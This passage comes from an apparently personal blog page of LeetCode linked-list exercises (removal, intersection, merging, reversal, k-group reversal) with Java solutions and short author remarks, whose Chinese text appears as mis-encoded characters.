class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(l1.val!=l2.val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        l1=l1.next;</span><br><span class="line">        l2=l2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">cut</span><span class="params">(ListNode head, ListNode slow)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">root</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="keyword">while</span> (head.next!=slow)&#123;</span><br><span class="line">        head=head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    head.next=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverse</span><span class="params">(ListNode root)</span>&#123;</span><br><span class="line">    ListNode head=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span>root.next;</span><br><span class="line">        root.next=head.next;</span><br><span class="line">        head.next=root;</span><br><span class="line">        root=next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1><span id="åŒæŒ‡é’ˆæ³•">åŒæŒ‡é’ˆæ³•</span></h1><h2><span id="203-remove-linked-list-elements">203. Remove Linked List Elements âˆš</span></h2><p>Remove all elements from a linked list of integers that have value *<strong>val*</strong>.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input:  1-&gt;2-&gt;6-&gt;3-&gt;4-&gt;5-&gt;6, val = 6</span><br><span class="line">Output: 1-&gt;2-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    ListNode p1=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    p1.next=head;</span><br><span class="line">    ListNode p2=<span class="literal">null</span>;</span><br><span class="line">    ListNode n=p1;</span><br><span class="line">    <span class="keyword">while</span>(p1!=<span class="literal">null</span>&amp;&amp;p1.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        p2=p1.next;</span><br><span class="line">        <span class="keyword">if</span>(p2.val==val)</span><br><span class="line">            p1.next=p2.next;</span><br><span class="line">        <span class="keyword">else</span> p1=p1.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="160-intersection-of-two-linked-lists">160. Intersection of Two Linked Lists âˆš</span></h2><p>Write a program to find the node at which the intersection of two singly linked lists begins.</p><p>For example, the following two linked lists:</p><p><a href="https://assets.leetcode.com/uploads/2018/12/13/160_statement.png"><img src="https://assets.leetcode.com/uploads/2018/12/13/160_statement.png" alt="img"></a></p><p>begin to intersect at node c1.</p><p>å‡è®¾Açš„é•¿åº¦ä¸ºaï¼ŒBçš„é•¿åº¦ä¸ºbï¼Œåˆ™æ€»é•¿åº¦ä¸ºa+bã€‚</p><p>å‡è®¾a&#x3D;a<sub>1</sub>+cï¼Œb&#x3D;b<sub>1</sub>+c åˆ™a<sub>1</sub>+c+b<sub>1</sub>&#x3D;&#x3D;b<sub>1</sub>+c+a<sub>1</sub>ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A:          a1 â†’ a2       d1 â†’ d2</span><br><span class="line">                    â†˜  â†—</span><br><span class="line">                      c</span><br><span class="line">                    â†—  â†˜</span><br><span class="line">B:    b1 â†’ b2 â†’ b3        e1 â†’ e2</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">l1</span> <span class="operator">=</span> headA, l2 = headB;</span><br><span class="line">    <span class="keyword">while</span> (l1 != l2) &#123;</span><br><span class="line">        l1 = (l1 == <span class="literal">null</span>) ? headB : l1.next;</span><br><span class="line">        l2 = (l2 == <span class="literal">null</span>) ? headA : l2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="åˆ é™¤èŠ‚ç‚¹">åˆ é™¤èŠ‚ç‚¹</span></h1><h2><span id="19-remove-nth-node-from-end-of-list">19. Remove Nth Node From End of List âˆš</span></h2><p>Given a linked list, remove the <em>n</em>-th node from the end of list and return its head.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Given linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5, and n = 2.</span><br><span class="line"></span><br><span class="line">After removing the second node from the end, the linked list becomes 1-&gt;2-&gt;3-&gt;5.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    dummy.next=head;</span><br><span class="line">    ListNode fast=dummy,slow=dummy;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        fast=fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        slow=slow.next;</span><br><span class="line">        fast=fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    slow.next=slow.next.next;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="83-remove-duplicates-from-sorted-list">83. Remove Duplicates from Sorted List Ã—</span></h2><p>Given a sorted linked list, delete all duplicates such that each element appear only <em>once</em>.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;1-&gt;2</span><br><span class="line">Output: 1-&gt;2</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;1-&gt;2-&gt;3-&gt;3</span><br><span class="line">Output: 1-&gt;2-&gt;3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">deleteDuplicates</span><span class="params">(ListNode head)</span> &#123;       </span><br><span class="line">    ListNode q=head;</span><br><span class="line">    <span class="keyword">while</span>(q!=<span class="literal">null</span>&amp;&amp;q.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(q.val==q.next.val)q.next=q.next.next;</span><br><span class="line">        <span class="keyword">else</span> q=q.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬æ¥åŠ äº†ä¸€ä¸ªdummyï¼Œç„¶ååˆ¤æ–­æ¡ä»¶æœ‰é—®é¢˜å¯¼è‡´å‰é¢çš„é‡å¤å¯ä»¥æ¶ˆé™¤è€Œæœ€åè¿æ¥NULLçš„é‡å¤å…ƒç´ å°±æ¶ˆé™¤ä¸äº†ã€‚</p><h2><span id="82-remove-duplicates-from-sorted-list-ii">82. Remove Duplicates from Sorted List II Ã—</span></h2><p>Given a sorted linked list, delete all nodes that have duplicate numbers, leaving only <em>distinct</em> numbers from the original list.</p><p>Return the linked list sorted as well.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5</span><br><span class="line">Output: 1-&gt;2-&gt;5</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;1-&gt;1-&gt;2-&gt;3</span><br><span class="line">Output: 2-&gt;3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">deleteDuplicates</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">null</span>||head.next==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">123</span>==head.val?<span class="number">0</span>:-<span class="number">123</span>);</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> dummy;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">    ListNode root=dummy;</span><br><span class="line">    <span class="keyword">while</span>(cur!=<span class="literal">null</span>&amp;&amp;cur.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur.val!=pre.val&amp;&amp;cur.val!=cur.next.val)&#123;</span><br><span class="line">            root.next=cur;</span><br><span class="line">            root=root.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pre=cur;</span><br><span class="line">        cur=cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pre.val!=cur.val)&#123;</span><br><span class="line">        root.next=cur;</span><br><span class="line">        root=root.next;</span><br><span class="line">    &#125;</span><br><span class="line">    root.next=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="åŸºç¡€çš„è§£æ³•">åŸºç¡€çš„è§£æ³•</span></h1><h2><span id="21merge-two-sorted-lists">21.Merge Two Sorted Lists âˆš</span></h2><p>Merge two sorted linked lists and return it as a new list. The new list should be made by splicing together the nodes of the first two lists.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;4, 1-&gt;3-&gt;4</span><br><span class="line">Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</span><br></pre></td></tr></table></figure><ul><li>å¾ªç¯è§£æ³•</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;    </span><br><span class="line">ListNode head=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">res</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="keyword">while</span>(l1!=<span class="literal">null</span>&amp;&amp;l2!=<span class="literal">null</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(l1.val&lt;=l2.val)&#123;</span><br><span class="line">    head.next=l1;</span><br><span class="line">    l1=l1.next;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    head.next=l2;</span><br><span class="line">    l2=l2.next;</span><br><span class="line">    &#125; </span><br><span class="line">    head=head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    head.next = l1==<span class="literal">null</span>?l2:l1;</span><br><span class="line">    <span class="keyword">return</span> res.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é€’å½’è§£æ³•ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (l1 == <span class="literal">null</span>) <span class="keyword">return</span> l2;</span><br><span class="line">    <span class="keyword">if</span> (l2 == <span class="literal">null</span>) <span class="keyword">return</span> l1;</span><br><span class="line">    <span class="keyword">if</span> (l1.val &lt; l2.val) &#123;</span><br><span class="line">        l1.next = mergeTwoLists(l1.next, l2);</span><br><span class="line">        <span class="keyword">return</span> l1;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l2.next = mergeTwoLists(l1, l2.next);</span><br><span class="line">        <span class="keyword">return</span> l2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="445-add-two-numbers-ii">445. Add Two Numbers II â€”</span></h2><p>You are given two <strong>non-empty</strong> linked lists representing two non-negative integers. The most significant digit comes first and each of their nodes contain a single digit. Add the two numbers and return it as a linked list.</p><p>You may assume the two numbers do not contain any leading zero, except the number 0 itself.</p><p><strong>Follow up:</strong><br>What if you cannot modify the input lists? In other words, reversing the lists is not allowed.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: (7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 8 -&gt; 0 -&gt; 7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        Stack&lt;Integer&gt; s1 = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        Stack&lt;Integer&gt; s2 = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">null</span>)&#123;</span><br><span class="line">            s1.push(l1.val);</span><br><span class="line">            l1=l1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l2!=<span class="literal">null</span>)&#123;</span><br><span class="line">            s2.push(l2.val);</span><br><span class="line">            l2=l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> carry=<span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span>(!s1.isEmpty()||!s2.isEmpty()||carry!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> s1.isEmpty()?<span class="number">0</span>:s1.pop();</span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> s2.isEmpty()?<span class="number">0</span>:s2.pop();</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> x+y+carry;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">            carry=sum/<span class="number">10</span>;</span><br><span class="line">            node.next=ans.next;</span><br><span class="line">            ans.next=node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="22-é“¾è¡¨ä¸­å€’æ•°ç¬¬-k-ä¸ªç»“ç‚¹">22. é“¾è¡¨ä¸­å€’æ•°ç¬¬ K ä¸ªç»“ç‚¹ âˆš</span></h2><p><strong>é¢˜ç›®æè¿°</strong> :</p><p>è¾“å…¥ä¸€ä¸ªé“¾è¡¨ï¼Œè¾“å‡ºè¯¥é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªç»“ç‚¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">FindKthToTail</span><span class="params">(ListNode head,<span class="type">int</span> k)</span> &#123;</span><br><span class="line">    ListNode fast=head,slow=head;</span><br><span class="line">    <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;k--&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        fast=fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(k&gt;<span class="number">0</span>)<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span>(fast!=<span class="literal">null</span>)&#123;</span><br><span class="line">        slow=slow.next;</span><br><span class="line">        fast=fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="ç¿»è½¬é“¾è¡¨">ç¿»è½¬é“¾è¡¨</span></h1><h2><span id="206-reverse-linked-list">206. Reverse Linked List âˆš</span></h2><p>Reverse a singly linked list.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line">Output: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</span><br></pre></td></tr></table></figure><ul><li>å¾ªç¯è§£æ³•ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">newHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (head != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> head.next;</span><br><span class="line">        head.next = newHead.next;</span><br><span class="line">        newHead.next = head;</span><br><span class="line">        head = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newHead.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é€’å½’è§£æ³•ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> head.next;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">newHead</span> <span class="operator">=</span> reverseList(next);</span><br><span class="line">    next.next = head;</span><br><span class="line">    head.next = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> newHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="92-reverse-linked-list-ii">92. Reverse Linked List II âˆš</span></h2><p>Reverse a linked list from position <em>m</em> to <em>n</em>. Do it in one-pass.</p><p><strong>Note:</strong> 1 â‰¤ <em>m</em> â‰¤ <em>n</em> â‰¤ length of list.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4</span><br><span class="line">Output: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</span><br></pre></td></tr></table></figure><p>è‡ªå·±ç”¨äº†5ä¸ªæŒ‡é’ˆåšå‡ºæ¥çš„</p><p>sä»£è¡¨mä½ç½®çš„æŒ‡é’ˆï¼Œeä»£è¡¨nä½ç½®çš„æŒ‡é’ˆã€‚ä¸ºäº†é˜²æ­¢mä»1å¼€å§‹ä½¿ç”¨äº†dummyå¤´æŒ‡é’ˆã€‚</p><p>ç„¶årootä»£è¡¨så‰ä¸€ä¸ªæŒ‡é’ˆï¼Œtailä»£è¡¨eåä¸€ä¸ªæŒ‡é’ˆ</p><p>ä½†æ˜¯èƒœåœ¨å¥½ç†è§£ï¼Œç®€å•ç²—æš´ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseBetween</span><span class="params">(ListNode head, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">       dummy.next=head;</span><br><span class="line">       ListNode s=dummy,e=dummy,root=dummy,tail=dummy;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m-<span class="number">1</span>;i++)&#123;</span><br><span class="line">           root=root.next;</span><br><span class="line">       &#125;</span><br><span class="line">       s=root.next;</span><br><span class="line">       e=s;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n-m;i++)&#123;</span><br><span class="line">           e=e.next;</span><br><span class="line">       &#125;</span><br><span class="line">       tail=e.next;</span><br><span class="line">       e.next=<span class="literal">null</span>;</span><br><span class="line">       ListNode tmp=s;</span><br><span class="line">       reverse(tmp);</span><br><span class="line">       root.next=e;</span><br><span class="line">       s.next=tail;</span><br><span class="line">       <span class="keyword">return</span> dummy.next;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(ListNode head)</span>&#123;</span><br><span class="line">       ListNode root=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">while</span>(head!=<span class="literal">null</span>)&#123;</span><br><span class="line">           ListNode next=head.next;</span><br><span class="line">           head.next=root.next;</span><br><span class="line">           root.next=head;</span><br><span class="line">           head=next;</span><br><span class="line">       &#125;        </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="25-reverse-nodes-in-k-group">25. Reverse Nodes in k-Group âˆš</span></h2><p>Given a linked list, reverse the nodes of a linked list <em>k</em> at a time and return its modified list.</p><p><em>k</em> is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of <em>k</em> then left-out nodes in the end should remain as it is.</p><p><strong>Example:</strong></p><p>Given this linked list: <code>1-&gt;2-&gt;3-&gt;4-&gt;5</code></p><p>For <em>k</em> &#x3D; 2, you should return: <code>2-&gt;1-&gt;4-&gt;3-&gt;5</code></p><p>For <em>k</em> &#x3D; 3, you should return: <code>3-&gt;2-&gt;1-&gt;4-&gt;5</code></p><p>åªè¦æŒæ¡äº†reverseè¿™ä¸ªå‡½æ•°å’Œdummyè¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±èƒ½åšå‡ºæ¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseKGroup</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">       <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> count(head,<span class="number">0</span>);</span><br><span class="line">       <span class="type">int</span> cnt=len/k;</span><br><span class="line">       ListNode dummy=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">       dummy.next=head;</span><br><span class="line">       ListNode root=dummy,l1=head,l2=head;</span><br><span 